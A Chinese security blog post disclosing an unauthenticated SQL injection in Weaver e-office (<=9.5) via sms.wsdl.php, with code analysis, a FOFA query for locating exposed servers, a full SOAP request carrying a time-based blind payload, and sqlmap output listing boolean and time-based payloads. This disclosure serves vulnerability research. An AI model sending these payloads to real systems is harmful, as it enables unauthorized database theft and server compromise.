---
title: "泛微e-office sms.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-sms-wsdl-sqli.html
asset_dir: assets/泛微e-office-sms.wsdl.php-sql注入漏洞
---

# 泛微e-office sms.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/18 18:40
* 644浏览
* [0评论](#comment)
* 53分钟阅读

深入探索

计算机安全

安全

Office


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office sms.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

深入探索

Web服务

office

安全研究工具

[![泛微e-office sms.wsdl.php sql注入漏洞](images/img-001-e13089c0e74c.webp)](https://image.mrxn.net/6f5786c6f8d841eda13eb275a55003f6.webp)

这里只拿第一个来简单过一遍

编程

[webservice](#)-json/sms/sms.wsdl.php 的 `cancelNotifySmsRemind` 业务逻辑如下

```
function cancelNotifySmsRemind( $notifyId, $UserInfor )
{
    $sms = authcheck( $UserInfor );
    if ( empty( $notifyId ) )
    {
        return 0;
    }
    $sms->cancelNotifySmsRemind( $notifyId );
    return 1;
}
```

深入探索

技术文章订阅

SQL注入检测工具

Docker加速服务

`$UserInfor` 带入 `authcheck` 函数

```
function authCheck( $UserInfor )
{
    checkcurrentsession( );
    return new sms( $UserInfor );
}

public function __construct( $userInfo = array( ) )
    {
        global $connection;
        if ( $userInfo['user_id'] == "" )
        {
            $this->userid = $_SESSION['LOGIN_USER_ID'];
        }
        else
        {
            $this->userid = $userInfo['user_id'];
        }
        if ( $this->userid )
        {
            $sql = "SELECT DEPT_ID,USER_PRIV FROM user WHERE USER_ID='".$this->userid."'";
            $rs = exequery( $connection, $sql );
            $row = mysql_fetch_array( $rs );
            $this->deptid = $row['DEPT_ID'];
            $this->uesrpriv = $row['USER_PRIV'];
        }
        $this->curdate = date( "Y-m-d", time( ) );
        $this->curdatetime = date( "Y-m-d H:i:s", time( ) );
    }
```

`$userInfo['user_id']`被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，和之前的[泛微e-office notify.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-notify-wsdl-sqli.html) 里一样。

代码安全审计

# 漏洞复现

```
POST /webservice-json/sms/sms.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:SmsServicewsdl#cancelNotifySmsRemind
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SmsServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:cancelNotifySmsRemind soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <notifyId xsi:type="xsd:string">1</notifyId>
         <UserInfor xsi:type="urn:UserInfor">
            <!--type: string-->
            <user_id xsi:type="xsd:string">1' AND 1094=BENCHMARK(5000000,MD5(0x706d4744))-- qpIp</user_id>
            <!--type: string-->
            <user_name xsi:type="xsd:string">quae divum incedo</user_name>
            <!--type: string-->
            <session_id xsi:type="xsd:string">verrantque per auras</session_id>
         </UserInfor>
      </urn:cancelNotifySmsRemind>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office sms.wsdl.php sql注入漏洞](images/img-002-148af01e57f4.webp)](https://image.mrxn.net/4f2a2ec276cf4fd69cae1e679f8e0089.webp)

成功在延时 5 秒

漏洞扫描服务

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 381 HTTP(s) requests:
---
Parameter: SOAP #2* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SmsServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:cancelNotifySmsRemind soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <notifyId xsi:type="xsd:string">1</notifyId>
         <UserInfor xsi:type="urn:UserInfor">
            <!--type: string-->
            <user_id xsi:type="xsd:string">1' RLIKE (SELECT (CASE WHEN (3536=3536) THEN 1 ELSE 0x28 END))-- kFbY</user_id>
            <!--type: string-->
            <user_name xsi:type="xsd:string">quae divum incedo</user_name>
            <!--type: string-->
            <session_id xsi:type="xsd:string">verrantque per auras</session_id>
         </UserInfor>
      </urn:cancelNotifySmsRemind>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SmsServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:cancelNotifySmsRemind soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <notifyId xsi:type="xsd:string">1</notifyId>
         <UserInfor xsi:type="urn:UserInfor">
            <!--type: string-->
            <user_id xsi:type="xsd:string">1' AND 1094=BENCHMARK(5000000,MD5(0x706d4744))-- qpIp</user_id>
            <!--type: string-->
            <user_name xsi:type="xsd:string">quae divum incedo</user_name>
            <!--type: string-->
            <session_id xsi:type="xsd:string">verrantque per auras</session_id>
         </UserInfor>
      </urn:cancelNotifySmsRemind>
   </soapenv:Body>
</soapenv:Envelope>
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office sms.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-sms-wsdl-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-webservice-json-sms-wsdl-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-sms-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALiUlEQVR4AeybjXLbOAyE8/X93zlXePMpIkRaTnONPVNlDrPE7gKkCema9OfX29vb+5/E++LLXl1+lF/5Vv3071Hvnqu1/ArLU6Fe6wrzFZanQr3Wfxo1kN+113+vcgPbQH5P9+2R6AcH3oCNtgdw4yG4GT4WMOdX9XDfb10hxFvrio8th/MA0htf3grgxm2GtoDoEGzyllavR2Ir+L3YBvJ7ff33AjdwGAhk6jDi6qw+ARC/PvmeQ3zqIoTXL6qL8jOE9NALyfXKixB9lXe+9zE/Q8g+MOKs7jCQmenifu4G/veBQJ4CP4JPmbkIcx+EX9VZP9Pl4H4PiG4vsdef8V03/w7+7wP5zmGu2re3HxsIcPvOxafQy4fw5l2Xh/jgHHuNuegeojykd+fVO99zfd/BHxvIdw75L9UeBuLUO64uBcan6lb3/n57GyAasJUDN20jPhYw5z/kA7jPDDV3De7voR9GHySHEd3nDO3bcVZ3GMjMdHE/dwPbQGCcPszzs6NB6nwa9D+aQ+qtg+S9vuuA1AGB21tpD0iuEcZcvqP1nYd5PYSH+7jvtw1kT17r593AL6f+VexHhjwF8pDcvjDm+kSY671ev6heKNextAr43h6QevvDmMvXXn8a1xviLb4Ing4E8hTAHH0S+ueRh9R1HcLrU4fwEJQ/80H8gCUbAtNfQyA8BLeCtoDo/QzNtqUQPwQ3oS3gqJ8OpPW40r98A4eBQKYGwf5U9Lyfb6V3/tEccg4I9v32uT1FuF+jT7SXOdyv737z7+BhIN9pdtV+/wZ+QZ4CCPp02BpGHsZc3xlC6vRBcgjKd/Q87+/vtz/RVO985WpicfuA7CWn7wz1Q+r1y5vDqJ/xvb781xtSt/BCcToQpwiZvnn/DCu++8z1i50376gfch5Yo7UQj/kZwn2/Z7APzP3d1/2QOvjE04HY5MKfuYHlQJwuZHo993gQ3byjdaI6pA6Cj/L6ej/5QjVIb3OxPBUQHYLFVXRfcfuA0b/X7q1hrHOfPS4Hcq/xpf29Gzj8XhZkihB0eh7BHKLLixAe7qN9ep28qC5C+prvcVWjB1ILwe7/am5f60R5ccWr7/F6Q/a38QLr5c8hThXyNMGI6uKjn0U/pJ91nYfoEOy+nle9HKSmuAoYc30rhPjVYcxXPIw+GHPr6kwV5nu83pD9bbzA+uFfQ2qi++hnh/Fp0Nt9Pf+qD8Z9er9Z3vcY8knBSofH9rZehNSZ9y0hOvBzfw3o7fp66Aa2/2VBpuQURQhvNxhzef3morwIqTfXB+HNz3R9e4SxhxrMefWOED8Eu97P1nWY13XfLN8GMhMv7udvYPsuy6nDON3O99wjw1gHyWFE61d1K77X6XsErYXxLNZ2XV5UFzu/ylc85Bxdr/7XG+KtvAgeBlJTqoBMEYLFVUDyfv7SKlZ8aRUwr1/VyUPqqkcFJIdP1Ft6BUTrfGkV8issT8VKl4f5PhAeRrRuhoeBzEwX93M3sP0cAo9N